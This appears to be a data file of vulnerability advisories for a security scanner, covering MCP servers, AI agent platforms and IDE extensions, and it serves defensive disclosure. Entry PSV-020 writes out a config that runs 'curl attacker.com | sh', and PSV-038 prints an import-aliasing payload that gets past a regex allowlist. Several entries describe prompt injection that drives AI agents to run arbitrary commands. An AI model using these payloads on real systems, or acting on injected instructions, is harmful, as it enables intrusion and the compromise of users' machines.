  { id: "PSV-013", category: "PSV", severity: "BLOCK", title: "Cursor IDE CVE-2026-31854 RCE via Indirect Prompt Injection", description: "CVE-2026-31854 is a high severity RCE vulnerability in Cursor IDE (versions prior to 2.0) where malicious websites can use indirect prompt injection to bypass command whitelists and execute arbitrary commands. Update Cursor to version 2.0 or later.", tags: ["cursor", "rce", "cve-2026-31854", "prompt-injection"] },
  { id: "PSV-014", category: "PSV", severity: "WARN", title: "Apollo MCP Server CVE-2026-35577 DNS Rebinding", description: "CVE-2026-35577 is a medium severity DNS rebinding vulnerability in Apollo MCP Server (versions prior to 1.7.0) when using StreamableHTTP transport due to improper Host header validation. Update Apollo MCP Server to version 1.7.0 or later.", tags: ["apollo-mcp", "dns-rebinding", "cve-2026-35577"] },
  { id: "PSV-015", category: "PSV", severity: "BLOCK", title: "MCP Go SDK DNS rebinding vulnerability (CVE-2026-34742, go-sdk < v1.4.0)", description: "CVE-2026-34742 (GHSA-xw59-hvm2-8pj6) is a DNS rebinding vulnerability in the MCP Go SDK prior to v1.4.0. HTTP-based MCP servers do not enable DNS rebinding protection by default when running on localhost without authentication. A malicious website can exploit this to bypass same-origin policy and invoke tools or access resources on the local MCP server. Upgrade github.com/modelcontextprotocol/go-sdk to v1.4.0 or later.", tags: ["mcp", "go-sdk", "dns-rebinding", "cve-2026-34742", "localhost"] },
  { id: "PSV-016", category: "PSV", severity: "BLOCK", title: "mobile-mcp arbitrary Android intent execution via unvalidated URL (CVE-2026-35394, < 0.0.50)", description: "CVE-2026-35394 (GHSA-5qhv-x9j4-c3vm) is a critical vulnerability in mobile-mcp (mobilenexthq) prior to version 0.0.50. The mobile_open_url tool passes user-supplied URLs directly to Android's intent system without scheme validation, allowing arbitrary intent execution including phone calls (tel:), SMS (sms:), USSD codes (ussd:), and content provider access. Upgrade mobile-mcp to 0.0.50 or later. Until patched, restrict access to the mobile_open_url tool and validate all URL schemes before passing to Android intents.", tags: ["mobile-mcp", "android", "intent-injection", "rce", "cve-2026-35394"] },
  { id: "PSV-017", category: "PSV", severity: "BLOCK", title: "OpenClaw WebSocket authorization bypass — self-declared scope elevation (CVE-2026-22172, < 2026.3.12)", description: "CVE-2026-22172 is a critical authorization bypass vulnerability in OpenClaw prior to version 2026.3.12. The WebSocket connect path allows shared-token or password-authenticated connections to self-declare elevated scopes (e.g., operator.admin) without server-side binding validation. This enables attackers to perform admin-only gateway operations without proper authorization. Upgrade OpenClaw to version 2026.3.12 or later immediately.", tags: ["openclaw", "websocket", "authorization-bypass", "scope-elevation", "cve-2026-22172"] },
  { id: "PSV-018", category: "PSV", severity: "BLOCK", title: "n8n-MCP Server SSRF via multi-tenant HTTP header (CVE-2026-39974)", description: "CVE-2026-39974 is a Server-Side Request Forgery (SSRF) vulnerability in the multi-tenant HTTP mode of n8n-MCP prior to version 2.47.4. An authenticated attacker holding a valid AUTH_TOKEN can inject arbitrary URLs through multi-tenant HTTP headers, causing the server to fetch and return those URLs via JSON-RPC. This enables cloud metadata harvesting (AWS IMDS, GCP, Azure), internal service discovery, and data exfiltration. Update n8n-MCP to version 2.47.4 or later.", tags: ["mcp_server", "ssrf", "n8n", "cve-2026-39974"] },
  { id: "PSV-019", category: "PSV", severity: "BLOCK", title: "mcp-server-taskwarrior command injection RCE (CVE-2026-5833, <= 1.0.1)", description: "CVE-2026-5833 is a command injection vulnerability in awwaiid mcp-server-taskwarrior up to version 1.0.1 that enables remote code execution through local exploitation. The flaw allows unsanitized input to reach shell command execution paths in the MCP server. Update to a patched version or remove the vulnerable MCP server from your configuration.", tags: ["mcp_server", "command_injection", "rce", "cve-2026-5833"] },
  { id: "PSV-020", category: "PSV", severity: "BLOCK", title: "MCP STDIO arbitrary command injection via unsanitized adapter configuration (CVE-2026-30623/30624/30616/30617/30618/33224)", description: "OX Security (April 15, 2026) disclosed a systemic MCP STDIO command injection vulnerability affecting multiple AI platforms: LiteLLM (CVE-2026-30623), Agent Zero (CVE-2026-30624), Jaaz (CVE-2026-30616), LangChain-ChatChat (CVE-2026-30617), Fay Digital Human (CVE-2026-30618), Bisheng (CVE-2026-33224), LangFlow, and GPT Researcher (CVE-2025-65720). All affected platforms pass user-supplied MCP server command and args values directly to StdioServerParameters without sanitization, enabling unauthenticated or authenticated RCE. Attackers can supply a malicious MCP configuration (e.g., {\"command\": \"bash\", \"args\": [\"-c\", \"curl attacker.com | sh\"]}) to achieve full system compromise. Restrict MCP server configuration to trusted administrators, validate and allowlist permitted commands, and upgrade to patched versions as they become available.", tags: ["mcp_server", "command_injection", "rce", "stdio", "cve-2026-30623", "cve-2026-30624", "cve-2026-30616", "cve-2026-30617", "cve-2026-30618", "cve-2026-33224", "litellm", "agent-zero", "langchain", "langflow"] },
  { id: "PSV-021", category: "PSV", severity: "BLOCK", title: "Marimo reactive notebook pre-auth RCE via unauthenticated WebSocket terminal (CVE-2026-39987, < 0.23.0)", description: "CVE-2026-39987 (CVSS 9.3, CWE-306, GHSA-2679-6mx9-h9xc) is a critical pre-authentication remote code execution vulnerability in Marimo, a popular Python reactive notebook framework (~19.6k GitHub stars). The /terminal/ws WebSocket endpoint lacks authentication validation: while other endpoints correctly call validate_auth(), /terminal/ws only checks running mode and platform support, allowing any unauthenticated attacker to obtain a full PTY shell and execute arbitrary system commands. The vulnerability was exploited in the wild within 10 hours of disclosure. Upgrade Marimo to version 0.23.0 or later immediately. Do not expose Marimo instances to untrusted networks.", tags: ["marimo", "pre-auth-rce", "websocket", "missing-authentication", "cve-2026-39987", "notebook", "python"] },
  { id: "PSV-022", category: "PSV", severity: "WARN", title: "docker-mcp-server OS command injection RCE (CVE-2026-5741, <= 0.1.0)", description: "CVE-2026-5741 (CWE-77, CVSS 6.9) is an OS command injection vulnerability in suvarchal docker-mcp-server up to version 0.1.0. The stop_container(), remove_container(), and pull_image() functions in src/index.ts pass user-supplied container names and image identifiers directly to shell commands without sanitization. Attackers can inject shell metacharacters (;, &&, ||, backticks, $()) to execute arbitrary OS commands with the privileges of the docker-mcp-server process. No official patch is available at time of publication. Restrict network access to the docker-mcp-server HTTP interface to localhost or trusted networks only, and avoid exposing it publicly.", tags: ["docker", "mcp_server", "command_injection", "rce", "cve-2026-5741"] },
  { id: "PSV-023", category: "PSV", severity: "BLOCK", title: "nginx-ui MCP endpoint authentication bypass — unauthenticated nginx takeover (CVE-2026-33032, <= 2.3.5)", description: "CVE-2026-33032 (CVSS 9.8, CWE-306, GHSA-h6c2-x2m2-mwhf) is a critical authentication bypass in nginx-ui versions 2.3.5 and prior. The nginx-ui MCP integration exposes two HTTP endpoints: /mcp (requires IP whitelisting + authentication) and /mcp_message (only IP whitelisting, default empty = allow all). Any network attacker can invoke all MCP tools via /mcp_message without authentication, including restarting nginx, creating/modifying/deleting nginx configuration files, and triggering automatic config reloads — achieving complete nginx service takeover. Actively exploited in the wild against 2,600+ exposed instances since March 2026. No official patch available at time of publication. Disable the MCP integration endpoint or restrict /mcp_message to trusted IPs via firewall rules immediately.", tags: ["nginx", "mcp_server", "auth_bypass", "actively_exploited", "cve-2026-33032"] },
  { id: "PSV-024", category: "PSV", severity: "BLOCK", title: "Apache SkyWalking MCP SSRF via SW-URL Header (CVE-2026-34476)", description: "CVE-2026-34476 is a Server-Side Request Forgery (SSRF) vulnerability in Apache SkyWalking MCP version 0.1.0. Attackers can forge requests to internal resources by manipulating the SW-URL header. Upgrade to Apache SkyWalking MCP version 0.2.0 or later, which fixes this issue.", tags: ["apache", "skywalking", "mcp_server", "ssrf", "cve-2026-34476"] },
  { id: "PSV-025", category: "PSV", severity: "BLOCK", title: "Open VSX Pre-Publish Scanning Bypass (Open Sesame)", description: "A vulnerability in Open VSX (versions prior to 0.32.0) allows malicious VS Code extensions to bypass pre-publish security checks. The Java-based service misinterprets scanner job failures (e.g., due to database connection pool exhaustion from a flood of publish requests) as \"no scanners are configured,\" leading to extensions being marked as passed (fail-open). Upgrade Open VSX to version 0.32.0 or later, which fixes this fail-open behavior.", tags: ["openvsx", "scan_bypass", "fail_open"] },
  { id: "PSV-026", category: "PSV", severity: "BLOCK", title: "mcp-neo4j SSE command injection RCE (CVE-2025-56406, mcp-neo4j 0.3.0)", description: "CVE-2025-56406 is a command injection vulnerability in mcp-neo4j version 0.3.0. The unauthenticated SSE (Server-Sent Events) service endpoint allows attackers to execute arbitrary commands or exfiltrate Neo4j database contents. Bind the mcp-neo4j service exclusively to localhost, deploy behind a reverse proxy with authentication, or restrict access via firewall rules.", tags: ["mcp", "neo4j", "command_injection", "rce"] },
  { id: "PSV-027", category: "PSV", severity: "WARN", title: "AAP MCP Server log injection via unsanitized toolsetroute (CVE-2026-6494)", description: "CVE-2026-6494 is a log injection vulnerability in the Red Hat AAP MCP server. An unauthenticated remote attacker can inject ANSI escape sequences and newlines via the unsanitized toolsetroute parameter, forging log entries to facilitate social engineering attacks that trick operators into executing dangerous commands or visiting malicious URLs. Apply the Red Hat security patch when available and sanitize all log inputs.", tags: ["mcp", "aap", "log_injection", "social_engineering"] },
  { id: "PSV-028", category: "PSV", severity: "BLOCK", title: "OpenClaw privilege escalation via device.pair.approve scope validation bypass (CVE-2026-35639, < 2026.3.22)", description: "CVE-2026-35639 (CVSS 8.7, CWE-648) is a privilege escalation vulnerability in OpenClaw prior to version 2026.3.22. Improper scope validation in the device.pair.approve flow allows attackers to escalate privileges during device pairing approval. Upgrade OpenClaw to version 2026.3.22 or later immediately.", tags: ["openclaw", "privilege_escalation", "device_pairing"] },
  { id: "PSV-029", category: "PSV", severity: "BLOCK", title: "OpenClaw privilege escalation via silent local shared-auth reconnect (CVE-2026-35625, < 2026.3.25)", description: "CVE-2026-35625 (CVSS 8.5, CWE-648) is a privilege escalation vulnerability in OpenClaw prior to version 2026.3.25. The silent local shared-auth reconnect mechanism allows attackers to silently re-establish authenticated sessions with elevated privileges. Upgrade OpenClaw to version 2026.3.25 or later immediately.", tags: ["openclaw", "privilege_escalation", "authentication_bypass"] },
  { id: "PSV-030", category: "PSV", severity: "BLOCK", title: "OpenClaw improper access control in /sessions/:sessionKey/kill endpoint (CVE-2026-34512, < 2026.3.25)", description: "CVE-2026-34512 (CVSS 7.2, CWE-863) is an improper access control vulnerability in OpenClaw prior to version 2026.3.25. The /sessions/:sessionKey/kill endpoint does not properly validate authorization, allowing unauthorized users to terminate active sessions. Upgrade OpenClaw to version 2026.3.25 or later.", tags: ["openclaw", "access_control", "session_management"] },
  { id: "PSV-031", category: "PSV", severity: "BLOCK", title: "OpenClaw privilege escalation via chat.send to allowlist persistence (CVE-2026-35621, < 2026.3.24)", description: "CVE-2026-35621 (CVSS 7.1, CWE-862) is a privilege escalation vulnerability in OpenClaw prior to version 2026.3.24. Attackers can use the chat.send endpoint to persist entries in the allowlist, achieving persistent privilege escalation. Upgrade OpenClaw to version 2026.3.24 or later.", tags: ["openclaw", "privilege_escalation", "allowlist_bypass"] },
  { id: "PSV-032", category: "PSV", severity: "BLOCK", title: "mcp-server-kubernetes kubectl argument injection RCE (CVE-2026-39884, <= 3.4.0)", description: "CVE-2026-39884 (CVSS 8.3, CWE-88) is an argument injection vulnerability in mcp-server-kubernetes versions 3.4.0 and prior. The port_forward tool constructs a kubectl command via string concatenation with user-controlled input (namespace, resourceType, resourceName, localPort, targetPort) and naively splits on spaces before passing to spawn(). This allows injection of arbitrary kubectl flags such as --address=0.0.0.0 to expose internal Kubernetes services to the network, cross-namespace targeting via -n flags, and indirect exploitation via prompt injection against AI agents connected to the MCP server. Upgrade to mcp-server-kubernetes version 3.5.0 or later.", tags: ["mcp", "kubernetes", "argument-injection", "kubectl", "rce"] },
  { id: "PSV-033", category: "PSV", severity: "BLOCK", title: "mcp-framework HTTP server DoS via unbounded POST body (CVE-2026-39313, <= 0.2.21)", description: "CVE-2026-39313 is a denial-of-service vulnerability in mcp-framework versions 0.2.21 and below. The readRequestBody() function in the HTTP transport layer does not enforce any size limit on incoming POST requests to the /mcp endpoint, allowing a remote unauthenticated attacker to send a single large POST request that exhausts server memory and crashes the process. Upgrade mcp-framework to a patched version or implement request body size limits at the reverse proxy layer.", tags: ["mcp", "dos", "memory-exhaustion"] },
  { id: "PSV-034", category: "PSV", severity: "BLOCK", title: "OpenClaw WebView JavascriptInterface RCE (CVE-2026-35643, < 2026.3.22)", description: "CVE-2026-35643 is a remote code execution vulnerability in OpenClaw versions prior to 2026.3.22. Attackers can inject malicious code through unvalidated WebView JavascriptInterface in the Android application components, potentially leading to full application compromise and data theft. Upgrade OpenClaw to version 2026.3.22 or later.", tags: ["openclaw", "webview", "rce", "android"] },
  { id: "PSV-035", category: "PSV", severity: "BLOCK", title: "Flowise authenticated RCE via MCP adapter STDIO command injection (CVE-2026-40933)", description: "CVE-2026-40933 (GHSA-c9gw-hvqq-f33r) is a critical authenticated RCE vulnerability in Flowise. Due to unsafe serialization of stdio commands in the MCP adapter, an authenticated attacker can add an MCP stdio server with an arbitrary command, achieving remote code execution. Restrict access to the MCP adapter configuration and upgrade Flowise to a patched version.", tags: ["flowise", "mcp", "stdio", "rce", "command-injection"] },
  { id: "PSV-036", category: "PSV", severity: "BLOCK", title: "MCP server command injection via insufficient shellQuote — CVE-2026-5603 (@elgentos/magento2-dev-mcp <= 1.0.2)", description: "CVE-2026-5603 is a command injection vulnerability affecting @elgentos/magento2-dev-mcp versions <= 1.0.2. All 16 MCP tools in the package concatenate user-supplied parameters into shell commands using the `shell-quote` npm package, which only applies single-quote escaping. On Windows, cmd.exe does not recognize single quotes as quoting characters, so shell metacharacters (`&`, `|`, `>`, `<`) retain their command-separator semantics and allow arbitrary command execution. Upgrade to a version > 1.0.2 (PR #5) which replaces string concatenation with execFile() and argument arrays. More broadly: never pass shell-quoted strings to exec() when the target may be Windows cmd.exe — always use execFile with argv arrays.", tags: ["mcp_server", "command_injection", "magento", "cve-2026-5603", "windows-cmd"] },
  { id: "PSV-037", category: "PSV", severity: "BLOCK", title: "Cursor AI MCP OAuth impersonation RCE (CVE-2025-61591)", description: "CVE-2025-61591 (CVSS 8.8, CWE-78) affects Cursor AI code editor versions 1.7 and below. When MCP uses OAuth authentication with an untrusted MCP server, an attacker can impersonate a malicious MCP server and inject crafted commands during the interaction process, achieving OS command injection and RCE with full user privileges. Apply patch 2025.09.17-25b418f or upgrade to a version above 1.7. Only connect to trusted MCP servers and review OAuth grants.", tags: ["cursor", "mcp", "oauth", "rce", "command-injection"] },
  { id: "PSV-038", category: "PSV", severity: "BLOCK", title: "Flowise CSV Agent prompt-injection RCE (CVE-2026-41264, flowise-components < 3.1.0)", description: "CVE-2026-41264 (GHSA-3hjv-c53m-58jj, CVSS 8.1, CWE-184) is an unauthenticated prompt-injection-to-RCE vulnerability in flowise-components < 3.1.0. The CSV Agent node uses an LLM to generate pandas operations, then executes them via Pyodide. The input validation (a regex that blocks `\bimport\s+(?!pandas|numpy\b)`) can be bypassed by import aliasing — `import os as pandas; pandas.system(\"...\")` passes the allowlist because the module name after `import` is `os` (blocked) but `pd`, `np`, or `pandas` as an alias smuggles the forbidden module in. An unauthenticated attacker sending crafted prompts to a chatflow that uses the CSV Agent node can execute arbitrary commands on the Flowise server. Upgrade flowise-components to 3.1.0 or later; audit chatflows for CSV Agent usage; restrict unauthenticated access to chatflows.", tags: ["flowise", "csv_agent", "prompt_injection", "pyodide", "rce", "cve-2026-41264"] },
  { id: "PSV-039", category: "PSV", severity: "WARN", title: "Splunk MCP Server session token log disclosure (CVE-2026-20205, < 1.0.3)", description: "CVE-2026-20205 (CVSS 7.2, CWE-532) is a sensitive-information-in-log-file vulnerability in the Splunk MCP Server app versions < 1.0.3. Session and authorization tokens are written to logs in cleartext. A user with the `mcp_tool_admin` capability, access to the `_internal` index, or local filesystem read access to Splunk server logs can extract those tokens and use them to hijack sessions, escalate privileges, or access protected resources. Upgrade the Splunk MCP Server app to 1.0.3 or later. As a defense-in-depth measure, restrict the `_internal` index to least-privileged roles and audit who currently holds `mcp_tool_admin`.", tags: ["splunk", "mcp_server", "log_disclosure", "session_token", "cve-2026-20205"] },
  { id: "PSV-040", category: "PSV", severity: "BLOCK", title: "Azure DevOps MCP Server missing authentication (CVE-2026-32211, @azure-devops/mcp, CWE-306, CVSS 9.1)", description: "CVE-2026-32211 (CVSS 9.1, CWE-306) is a critical missing-authentication-for-critical-function vulnerability in the Azure DevOps MCP Server (@azure-devops/mcp). Disclosed by Microsoft on April 3, 2026, the server lacks proper authentication mechanisms, allowing an unauthenticated network attacker to access sensitive Azure DevOps data — work items, repositories, pipelines, and pull requests — without valid credentials. No patch is available as of April 25, 2026. Mitigate by implementing network-level access controls (firewall rules, reverse-proxy authentication), restricting the MCP server to loopback or trusted internal networks only, and monitoring for unauthorized access attempts until an official patch is released.", tags: ["azure", "azure-devops", "mcp_server", "missing_authentication", "information_disclosure", "cve-2026-32211"] },
  { id: "PSV-041", category: "PSV", severity: "BLOCK", title: "MCP Ruby SDK SSE session hijacking via session fixation (CVE-2026-33946, mcp gem < 0.9.2, CWE-384)", description: "CVE-2026-33946 (CVSS 7.5, CWE-384 Session Fixation / CWE-639 Authorization Bypass via User-Controlled Key) affects the MCP Ruby SDK (modelcontextprotocol/ruby-sdk, gem name: mcp) prior to version 0.9.2. The Streamable HTTP transport implementation in streamable_http_transport.rb does not invalidate or regenerate session identifiers when SSE connections are established, allowing an attacker who has obtained a valid session ID to replay it and fully hijack the victim's SSE stream, intercepting all real-time MCP tool results. Upgrade the mcp gem to >= 0.9.2, which patches the session binding in the Streamable HTTP transport.", tags: ["ruby", "mcp_server", "session_fixation", "sse_hijacking", "information_disclosure", "cve-2026-33946"] },
  { id: "PSV-042", category: "PSV", severity: "BLOCK", title: "OpenClaw untrusted workspace channel shadow RCE (CVE-2026-41295, < 2026.4.2)", description: "CVE-2026-41295 (CVSS 7.8 HIGH, CWE-829) affects OpenClaw before version 2026.4.2. The vulnerability is an improper trust boundary flaw: before a workspace plugin is explicitly trusted, built-in channel setup and login can resolve an untrusted workspace channel shadow. An attacker can clone a workspace containing a malicious plugin that claims a bundled channel ID, achieving unintended in-process code execution before the plugin is explicitly approved by the user. This enables RCE in developer environments and CI/CD pipelines that clone untrusted workspaces. Upgrade to OpenClaw 2026.4.2 or later. Audit workspace plugins before cloning untrusted repositories.", tags: ["openclaw", "rce", "workspace", "channel-shadow", "trust-boundary", "cve-2026-41295"] },
  { id: "PSV-043", category: "PSV", severity: "BLOCK", title: "Azure Data Explorer MCP Server KQL injection (CVE-2026-33980, GHSA-vphc-468g-8rfp, <= 0.1.1)", description: "CVE-2026-33980 (CVSS 8.3 HIGH, GHSA-vphc-468g-8rfp) is a KQL (Kusto Query Language) injection vulnerability in Microsoft's Azure Data Explorer MCP Server <= 0.1.1, disclosed March 27, 2026. The MCP tool handlers `get_table_schema`, `sample_table_data`, and `get_table_details` interpolate the user-supplied `table_name` parameter directly into KQL queries via Python f-strings, bypassing parameterized query mechanisms. An authenticated attacker can inject arbitrary KQL to read or modify any data the MCP server can access. Upgrade past commit 0abe0ee55279e111281076393e5e966335fffd30.", tags: ["azure", "kql-injection", "mcp-server", "microsoft", "cve-2026-33980", "ghsa-vphc-468g-8rfp"] },
  { id: "PSV-044", category: "PSV", severity: "BLOCK", title: "MCPJam Inspector RCE via unauthenticated /api/mcp/connect endpoint (CVE-2026-23744, GHSA-232v-j27c-5pp6, @mcpjam/inspector <= 1.4.2)", description: "CVE-2026-23744 (CVSS 9.8 CRITICAL, CWE-306, GHSA-232v-j27c-5pp6) is a remote code execution vulnerability in @mcpjam/inspector versions <= 1.4.2. The /api/mcp/connect HTTP endpoint extracts command and args parameters from incoming requests and executes them directly without any authentication or validation. Because MCPJam Inspector binds to 0.0.0.0 by default (not 127.0.0.1), any network-reachable attacker can trigger arbitrary command execution with a single crafted HTTP POST. Upgrade to @mcpjam/inspector >= 1.4.3, which patches the endpoint to bind to localhost and require authentication.", tags: ["mcpjam", "rce", "missing-authentication", "mcp-inspector", "cve-2026-23744", "ghsa-232v-j27c-5pp6"] },
  { id: "PSV-045", category: "PSV", severity: "BLOCK", title: "Markdown Preview Enhanced RCE via crafted markdown file (CVE-2025-65716, shd101wyy.markdown-preview-enhanced, CVSS 8.8)", description: "CVE-2025-65716 (CVSS 8.8, CWE-79/RCE, OX Security February 2026) is an arbitrary code execution vulnerability in the Markdown Preview Enhanced VS Code extension (publisher: shd101wyy.markdown-preview-enhanced, 4M+ installs), affecting all published versions through 0.8.18. A crafted .md file triggers JavaScript execution inside the extension's preview pane: the script can enumerate open local ports, read arbitrary workspace files, and exfiltrate contents to an attacker-controlled server — no user interaction beyond opening the file in VS Code is required. No official patch is available. Mitigate by setting \"markdown-preview-enhanced.enableScriptExecution\": false in VS Code settings or disabling/uninstalling the extension. Avoid opening untrusted markdown files while the extension is active.", tags: ["vscode-extension", "markdown-preview-enhanced", "rce", "cve-2025-65716", "unpatched"] },
  { id: "PSV-046", category: "PSV", severity: "BLOCK", title: "LibreChat MCP STDIO unauthorized root command execution (CVE-2026-22252, < 0.8.2-rc2, CWE-285)", description: "CVE-2026-22252 (CWE-285 Improper Authorization) is a critical privilege escalation and RCE vulnerability in LibreChat versions < 0.8.2-rc2. The MCP STDIO interface fails to enforce authorization checks on the command execution path, allowing any authenticated user to submit a single API request that executes arbitrary shell commands as the root user inside the container — no additional privileges or user interaction required. Fixed in LibreChat 0.8.2-rc2. Upgrade immediately. As a stopgap, restrict LibreChat MCP STDIO access to trusted users only and run the container as a non-root user (add USER directive to your Dockerfile or compose override).", tags: ["librechat", "mcp-stdio", "rce", "privilege-escalation", "cve-2026-22252", "cwe-285"] },
  { id: "PSV-047", category: "PSV", severity: "BLOCK", title: "MaxKB AI assistant RCE cluster (CVE-2026-39417/39420/39421/39424, versions <= 2.7.1)", description: "MaxKB (by FIT2CLOUD) versions 2.7.1 and below contain a cluster of four critical RCE vulnerabilities disclosed April 13-16, 2026. CVE-2026-39417 (CVSS 9.8): incomplete fix for CVE-2025-53928 allowing authenticated RCE via the function library. CVE-2026-39420 (CVSS 9.8): sandbox escape via LD_PRELOAD manipulation allowing authenticated users to bypass sandbox protections and execute arbitrary code. CVE-2026-39421 (CVSS 9.8): sandbox escape via Python code execution allowing authenticated attackers to run arbitrary system commands. CVE-2026-39424 (CVSS 8.8): CSV formula injection in chat export enabling code execution when exported files are opened in spreadsheet applications. Upgrade MaxKB to version 2.7.2 or later immediately. All four vulnerabilities are exploitable by authenticated users, making them high-priority in multi-tenant deployments.", tags: ["maxkb", "rce", "sandbox-escape", "cve-2026-39417", "cve-2026-39420", "cve-2026-39421", "cve-2026-39424"] },
  { id: "PSV-048", category: "PSV", severity: "BLOCK", title: "OpenClaw workspace plugin auto-discovery RCE (CVE-2026-32920, < 2026.3.12)", description: "CVE-2026-32920 (CVSS 8.8, CWE-829) affects OpenClaw before version 2026.3.12. OpenClaw automatically discovers and loads plugins from .openclaw/extensions/ inside the current workspace directory without explicit trust verification. An attacker can include a crafted workspace plugin in a cloned repository; when the victim runs OpenClaw from that directory, the malicious plugin executes arbitrary code without any trust prompt. This enables RCE in developer environments and CI/CD pipelines that clone untrusted repositories. Upgrade OpenClaw to 2026.3.12 or later. Never run OpenClaw from untrusted cloned repositories without first auditing .openclaw/extensions/.", tags: ["openclaw", "rce", "workspace-plugin", "auto-discovery", "cve-2026-32920"] },
  { id: "PSV-049", category: "PSV", severity: "BLOCK", title: "OpenClaw exec allowlist safeBins policy bypass (CVE-2026-32009, < 2026.2.24)", description: "CVE-2026-32009 (CWE-184) affects OpenClaw before version 2026.2.24. The safeBins allowlist evaluation trusts static default directories including writable package-manager directories (e.g., npm global bin, pip scripts). An attacker who can write a malicious binary to any of these directories can bypass the exec allowlist and achieve arbitrary code execution in the OpenClaw runtime context. Upgrade OpenClaw to 2026.2.24 or later. Audit npm global and pip script directories for unexpected binaries.", tags: ["openclaw", "allowlist-bypass", "safebins", "exec", "cve-2026-32009"] },
  { id: "PSV-050", category: "PSV", severity: "BLOCK", title: "OpenClaw startup-time env var injection via config (CVE-2026-22177, < 2026.2.21)", description: "CVE-2026-22177 (CWE-454) affects OpenClaw before version 2026.2.21. OpenClaw fails to filter dangerous process-control environment variables (NODE_OPTIONS, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_INSERT_LIBRARIES, DYLD_LIBRARY_PATH) from config env.vars, allowing these variables to flow into gateway service runtime environments and enabling startup-time code execution in the OpenClaw process. An attacker with write access to OpenClaw configuration can inject these variables to execute arbitrary code when the gateway service starts. Upgrade OpenClaw to 2026.2.21 or later. Audit OpenClaw configuration for unexpected env.vars entries containing process-control variable names.", tags: ["openclaw", "env-injection", "node-options", "ld-preload", "startup-rce", "cve-2026-22177"] },
  { id: "PSV-051", category: "PSV", severity: "BLOCK", title: "Code Runner VS Code extension RCE via malicious executorMap settings (CVE-2025-65715, formulahendry.code-runner, CVSS 7.8)", description: "CVE-2025-65715 (CVSS 7.8, CWE-78, OX Security February 2026) is a code injection vulnerability in the Code Runner VS Code extension (formulahendry.code-runner, 37M+ installs), affecting all published versions through v0.12.2 and beyond. The extension passes code-runner.executorMap settings directly to Node.js child_process.spawn() with shell:true without sanitization, enabling RCE when a developer opens a crafted workspace or a compromised extension modifies settings.json. A malicious executorMap entry can establish a reverse shell on every Run Code invocation. No official patch available. Mitigate by removing the Code Runner extension or restricting code-runner.executorMap to trusted interpreters. Audit workspace and user settings.json for unexpected executorMap entries.", tags: ["vscode-extension", "code-runner", "rce", "cve-2025-65715", "unpatched"] },
  { id: "PSV-052", category: "PSV", severity: "BLOCK", title: "Live Server VS Code extension local file exfiltration via CORS bypass (CVE-2025-65717, ritwickdey.liveserver, CVSS 9.1)", description: "CVE-2025-65717 (CVSS 9.1 Critical, OX Security) is a local file exfiltration vulnerability in the Live Server VS Code extension (ritwickdey.liveserver, 72M+ installs), affecting v5.7.9 and all earlier versions. The extension serves workspace files over localhost:5500 without CORS restrictions, allowing any webpage visited while Live Server is running to make cross-origin fetch requests to http://localhost:5500, recursively crawl served files, and exfiltrate them to an attacker-controlled domain. No official patch available. Mitigate by stopping Live Server when browsing untrusted websites, binding the server to 127.0.0.1 only, or disabling the extension.", tags: ["vscode-extension", "live-server", "file-exfiltration", "cors-bypass", "cve-2025-65717", "unpatched"] },
  { id: "PSV-053", category: "PSV", severity: "BLOCK", title: "Azure DevOps MCP Server missing authentication information disclosure (CVE-2026-32211, @azure-devops/mcp, CVSS 9.1)", description: "CVE-2026-32211 (CVSS 9.1 Critical, CWE-306 Missing Authentication for Critical Function, disclosed 2026-04-03) is an information disclosure vulnerability in the Azure DevOps MCP Server (@azure-devops/mcp npm package). The server exposes MCP tools for Azure DevOps work items, repositories, pipelines, and pull requests without enforcing authentication, allowing any unauthenticated network attacker to access sensitive project data including configuration details, API tokens, and source code metadata. No official patch available as of 2026-04-29. Mitigate by placing the MCP server behind an authenticated reverse proxy, restricting network access via firewall rules, and rotating any Azure DevOps credentials that may have been exposed.", tags: ["azure-devops", "mcp-server", "missing-authentication", "information-disclosure", "cve-2026-32211", "cwe-306"] },
  { id: "PSV-054", category: "PSV", severity: "BLOCK", title: "DocsGPT hidden STDIO MCP command injection (CVE-2026-26015)", description: "CVE-2026-26015 is a critical command injection in DocsGPT (arc53/DocsGPT). The app exposes a hidden STDIO transport endpoint not visible in the Web-GUI. Attackers intercept requests, change transport to \"stdio\", and inject arbitrary OS commands into the JSON payload to achieve RCE. Upgrade DocsGPT to a patched version and restrict MCP config API access.", tags: ["cve-2026-26015", "mcp", "stdio", "command-injection", "docsgpt"] },
  { id: "PSV-055", category: "PSV", severity: "BLOCK", title: "LangChain/LangGraph triple vulnerability cluster — path traversal, unsafe deserialization, SQL injection (CVE-2026-34070, CVE-2025-68664, CVE-2025-67644)", description: "Three high-severity vulnerabilities (LangDrained, Cyera, March 2026) affect LangChain and LangGraph. CVE-2026-34070 (CVSS 7.5) is a path traversal in LangChain < 1.2.22. CVE-2025-68664 (CVSS 9.3) is unsafe deserialization leaking API keys and env secrets. CVE-2025-67644 (CVSS 7.3) is SQL injection in langgraph-checkpoint-sqlite < 3.0.1 exposing conversation histories. Upgrade LangChain >= 1.2.22 and langgraph-checkpoint-sqlite >= 3.0.1.", tags: ["cve-2026-34070", "cve-2025-68664", "cve-2025-67644", "langchain", "langgraph", "path-traversal", "deserialization", "sql-injection"] },
  { id: "PSV-056", category: "PSV", severity: "BLOCK", title: "React2Shell — React Server Components pre-auth RCE via Flight protocol prototype pollution (CVE-2025-55182, CVSS 10.0)", description: "CVE-2025-55182 (React2Shell, CVSS 10.0) is a critical pre-authentication RCE in React Server Components 19.0.0-19.2.0. The React Server Flight protocol fails to validate payloads, allowing attackers to inject structures that trigger prototype pollution and achieve unauthenticated RCE in one step. CVE-2025-66478 is the companion Next.js flaw. Upgrade React >= 19.2.1 and Next.js >= 15.3.1 immediately.", tags: ["cve-2025-55182", "cve-2025-66478", "react2shell", "react-server-components", "prototype-pollution", "pre-auth-rce"] },
